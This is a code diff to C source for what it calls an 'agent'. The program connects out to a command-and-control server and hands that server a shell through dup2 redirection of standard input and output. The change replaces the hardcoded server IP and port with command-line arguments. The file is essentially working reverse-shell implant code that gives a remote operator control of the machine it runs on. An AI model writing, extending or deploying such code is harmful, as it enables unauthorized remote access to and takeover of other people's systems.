@@ -7,9 +7,6 @@
 #include <unistd.h>
 #include <string.h>
 
-#define SERVER_IP "192.168.1.151"
-#define SERVER_PORT 6666
-
 void spawn_shell(int socket) {
   dup2(socket,0);
   dup2(socket,1);
@@ -46,24 +43,30 @@ void execute_command(int socket, char *command) {
 }
 
 int main(int argc, char *argv[]) {
-  int sockd;  
+  if(argc!=3) {
+    printf("./agent <ip> <port>\n");
+    return 0;
+  }
+  int sockd;
+  char *ip=argv[1];
+  int port =atoi(argv[2]);  
   struct sockaddr_in server_addr;
-  int read_size;  
-  char buffer[1024];
+  //int read_size;  
+  //char buffer[1024]; 
   sockd=socket(AF_INET,SOCK_STREAM,0);
   if(sockd<0){
     perror("[Err] Failed socket creation");
     exit(-1);
   }
   server_addr.sin_family=AF_INET;
-  server_addr.sin_addr.s_addr=inet_addr(SERVER_IP);
-  server_addr.sin_port=htons(SERVER_PORT);
+  server_addr.sin_port=htons(port);
+  server_addr.sin_addr.s_addr=inet_addr(ip);
   if(connect(sockd,(struct sockaddr *)&server_addr,sizeof(server_addr))<0){
     perror("[Err] Connection failed");
     close(sockd);
     exit(-1);
   }
-  printf("[Info] Connected to C2 at %s:%d\n",SERVER_IP,SERVER_PORT);
+  printf("[Info] Connected to C2 at %s:%d\n",ip,port);
   spawn_shell(sockd); 
   /*while(1) {
     read_size=recv(sockd, buffer, sizeof(buffer), 0);
